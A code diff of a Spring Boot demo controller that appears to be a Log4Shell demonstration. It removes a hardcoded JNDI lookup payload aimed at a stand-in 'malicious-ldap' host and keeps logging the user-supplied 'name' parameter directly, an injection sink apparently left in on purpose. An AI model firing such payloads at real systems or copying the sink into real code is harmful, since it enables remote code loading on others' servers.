@@ -18,10 +18,8 @@ public class DemoApplication {
 		SpringApplication.run(DemoApplication.class, args);
 	}
 
-	@GetMapping("/hello")
+	@GetMapping("/")
 	public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
-		logger.error("An ERROR Message");
-		logger.error("${jndi:ldap://malicious-ldap:1389/a}");
 		logger.error(name);
 		return String.format("Hello %s!", name);
 	}
